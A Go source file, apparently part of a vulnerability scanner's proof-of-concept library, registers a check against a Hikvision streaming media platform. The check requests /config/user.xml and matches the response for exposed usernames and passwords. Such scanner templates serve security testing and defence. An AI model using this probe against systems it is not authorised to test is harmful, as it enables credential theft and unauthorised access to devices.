package poc

func (Info *PocInfo) Hikvision_Streaming_Media_INFO_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "hikvision_streaming_media"
	poc.Info.Type = "INFO"
	poc.Info.Name = "Hikvision_Streaming_Media username and password INFO"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/config/user.xml"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = []string{"<user name=", "password="}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
